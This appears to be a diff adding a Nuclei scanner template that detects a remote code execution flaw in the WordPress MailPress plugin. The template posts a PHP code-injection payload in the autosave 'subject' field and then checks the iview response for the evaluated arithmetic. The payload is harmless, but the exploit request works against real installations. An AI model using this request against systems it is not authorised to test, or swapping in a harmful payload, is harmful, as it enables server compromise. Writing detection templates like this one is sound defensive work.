@@ -1,0 +1,46 @@
+id: wordpress-mailpress-rce
+info:
+  name: WordPress MailPress Plugin RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a remote code execution vulnerability in the MailPress plugin for WordPress, leveraging the autosave functionality.
+  reference:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
+variables:
+  r: "{{rand_int(800000000, 1000000000)}}"
+  r1: "{{rand_int(800000000, 1000000000)}}"
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}%2b{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "<autosave id='(.+?)'"
+    extractors:
+      - type: regex
+        name: extracted_id
+        part: body
+        regex:
+          - "<autosave id='(?P<id>.+?)'"
+        internal: true
+  - raw:
+      - |
+        GET /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{extracted_id}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{to_number(r)+to_number(r1)}}"
+        part: body
+flow: http(1) && http(2)
